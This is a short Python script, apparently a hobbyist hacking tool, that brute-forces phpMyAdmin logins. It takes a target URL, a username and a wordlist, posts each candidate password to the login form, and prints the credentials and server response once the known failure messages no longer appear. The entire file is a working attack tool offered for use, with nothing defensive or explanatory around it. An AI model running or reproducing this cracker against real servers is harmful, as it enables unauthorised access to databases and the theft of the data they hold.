#! python3

import requests

# Define main program function.
def passwordCracker():

        # Obtain necessary data from user.
        print('\n>>> phpMyAdmin Brut3F0rc3 p455sw0rd CR4ck3r <<<\n')
        url = input('Enter target URL: ')
        username = input('Enter username: ')
        wordlist = input('Enter wordlist: ')
        error = 'Access denied for user'
        print('')

        # Define brute forcing function. The function will take a password from the provided wordlist,
        # strip it of whitespace, and then submit it as pma_password in a HTTP POST request. The function
        # then reads the response returned from the server, searching for either a bad password error, a blank
        # password error, or the presence of a CSRF token. If none are found the program assumes the correct
        # password is found and outputs it to the user, along with the servers HTTP POST response from the server.
        def bruteForcer(url, username, error):
                for password in passwords:
                        password = password.strip()
                        print('Trying: ' + password)
                        postData = {"pma_username": username, "pma_password": password, "login": "submit"}
                        response = requests.post(url, data=postData)
                        if error in str(response.content):
                                pass
                        elif "Login without a password is forbidden" in str(response.content):
                                pass
                        elif "csrf" in str(response.content):
                                print("\nError - CSRF Token detected. Try another website.\n")
                                break
                        else:
                                print("\nBrut3F0rc3 successful - credentials found!!!\n")
                                print("Username: ---> " + username)
                                print("Password: ---> " + password)
                                print(response.text)
                                break

        # Open user wordlist in read mode, assign to passwords variable, and call brute forcing function.
        try:
                with open(wordlist, 'r') as passwords:
                        bruteForcer(url, username, error)

        # Error handling via try/except.
        except:
                print("\nAn error occurred. Close the program and try again.")
                exit()

        # If the end of wordlist is reached OR the program is successful, the following is printed:
        print('\nDone!')

# Calls the main program function within a While loop.
while True:
        passwordCracker()




